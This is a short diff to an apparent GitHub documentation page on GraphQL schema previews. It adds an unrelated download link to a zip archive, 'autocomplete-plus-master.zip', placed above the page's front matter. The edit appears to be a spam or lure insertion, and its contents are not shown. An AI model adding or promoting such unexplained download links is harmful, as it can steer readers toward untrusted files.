@@ -1,3 +1,4 @@
+[autocomplete-plus-master.zip](https://github.com/github/docs/files/7903579/autocomplete-plus-master.zip)
 ---
 title: Schema previews
 intro: 'You can preview upcoming features and changes to the {% data variables.product.prodname_dotcom %} GraphQL schema before they are added to the {% data variables.product.prodname_dotcom %} GraphQL API.'
